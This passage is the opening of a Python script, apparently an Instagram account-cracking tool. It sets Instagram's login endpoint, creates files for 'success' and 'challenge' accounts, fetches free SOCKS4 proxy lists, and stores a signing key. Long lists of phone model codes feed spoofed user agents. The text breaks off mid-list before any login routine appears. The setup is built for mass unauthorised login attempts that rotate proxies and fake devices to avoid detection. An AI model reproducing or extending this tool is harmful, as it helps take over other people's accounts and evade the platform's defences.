try:
    import json
    import random
    import requests
    import os
    import sys
    import datetime
    import time
    import urllib
    import uuid
    import calendar
    import hashlib
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    import base64
    import re  # إضافة مكتبة re للبحث عن IG-Set-Authorization
    from colorama import Fore, Style, init
    from tqdm import tqdm
    from rich import print as KenXinDev
    from concurrent.futures import ThreadPoolExecutor as Executor
except ImportError as e:
    exit(f'\n {Fore.RED}[>] Module {e} is not installed. Please install it using `pip install {e}`{Style.RESET_ALL}')
import random
import os
import hashlib
import base64
import uuid
import requests
import json
from rich import print as KenXinDev
import time
import sys
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
try:
    import json, uuid, hmac, random, hashlib, urllib, stdiomask, urllib.request, calendar, re
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests, bs4, json, os, sys, random, datetime, time
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
        
        

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from datetime import datetime
from bs4 import BeautifulSoup as parser

# تعريف المتغيرات العامة++
day = datetime.now().strftime("%d-%b-%Y")
current_GMT = time.gmtime(time.time())
insta_log1 = 'https://www.instagram.com/accounts/login/ajax/'
url = 'https://www.instagram.com'
menudump = []
import os

# --- التأكد من وجود المجلد والملفات المطلوبة ---
if not os.path.exists("result"):
    os.makedirs("result")

challenge_file = "result/challenge_accounts.txt"
success_file = "result/success_accounts.txt"

# إذا لم يوجد الملف يتم إنشاؤه فارغ
if not os.path.exists(challenge_file):
    with open(challenge_file, "w", encoding="utf-8") as f:
        f.write("")

if not os.path.exists(success_file):
    with open(success_file, "w", encoding="utf-8") as f:
        f.write("")


# جلب البروكسيات
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=20000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:
    try:
        prox = requests.get('https://raw.githubusercontent.com/MR-ALONE786/File-Cloning/main/Approved.txt').text
        open('.prox.txt', 'w').write(prox)
    except:
        print('GAGAL MENGAMBIL PROXY')
        prox = ''
prox = open('.prox.txt', 'r').read().splitlines()

# ألوان الواجهة
CY = '\033[96;1m'
H = '\033[1;32m'  # HIJAU
M = '\033[1;31m'  # MERAH
K = '\033[1;33m'  # KUNING
U = '\033[1;35m'  # UNGU
O = '\033[38;2;255;127;0;1m'  # ORANGE
C = '\033[0m'  # CLEAR
N = '\x1b[0m'  # WARNA MATI
import os
import json
import uuid
import hmac
import hashlib
import random
import time
import requests
from rich.console import Console
from rich.text import Text
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TaskProgressColumn

console = Console()

#:&hhhh
Z2 = "[#000000]"
M2 = "[#FF0000]"
H2 = "[#00FF00]"
Ha = "[#78FF00]"
K2 = "[#FFFF00]"
B2 = "[#00C8FF]"
U2 = "[#AF00FF]"
N2 = "[#FF00FF]"
O2 = "[#00FFFF]"
P2 = "[#FFFFFF]"
J2 = "[#FF8F00]"
A2 = "[#AAAAAA]"
Na = "[#ff0033]"

M = '\x1b[1;91m'
O = '\x1b[1;96m'
N = '\x1b[0m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
#7&'6

# Fixed HMAC key for signing payload
SIG_KEY = bytes.fromhex("5ad8f7f0b8b65d3d26f8e9a4c13b8453d3acb7aab0e6cbd768998220fa27e62d")



# قوائم الأجهزة لـ User-Agent
oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
rao = ['CE7', 'CE7j', 'CE9h','KE6', 'KE6j', 'KF6','KE7','LC8','KD6a','LD7', 'LD7j', 'MZ-TECNO LD7','KF6', 'KF6j', 'KF6i', 'KF6k', 'PR651h', 'PR651', 'PR651E', 'KF6m', 'KF6h', 'KF6n']
brook = ['X38','C65023','C6506','C6502','D6503','D6502','Xperia Z2','D6633','D6603','D6643','D6616','D6708','D6563','F5122','F5121','E6633','E5553','E6533','E5333']
viv = ['2022','2023','2024','2027','2005','2005A','2002A','1955A','1962','1945A','1945T','1937','1938','1938CT','1938T','1940','1935','1936A','1933','1934A','1930A','1930T','1927','1928','1928A','1922A','1923A','1921','1921A','1921T','1915','1916','1908','1909','1832A','1832T','1831A','1831T','1824A','1824BA','1817','1818','1814','1815','1816','1727','1730','1718','1719','1723','1724','1725','1601','1606','F1403','2109','2111','2080A','2085A','2072A','2073A','2056A','2054A','2057A','2047','2037','2036','2038']
vmo = ['1902','1906','1901','1904','1938CT','1723','1940','1928A','1909']
rmx = ['RMX1941','RMX1945','RMX1921','RMX1901']
poc = ['SM-M045F', 'SM-M045F/DS','SM-T509','SM-A042F', 'SM-A042F/DS', 'SM-A042M', 'SM-A042M/DS','SM-A047F', 'SM-A047F/DS', 'SM-A047F/DSN','SM-A045F', 'SM-A045F/DS','SM-M136B', 'SM-M136B/DS',]
gtp = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-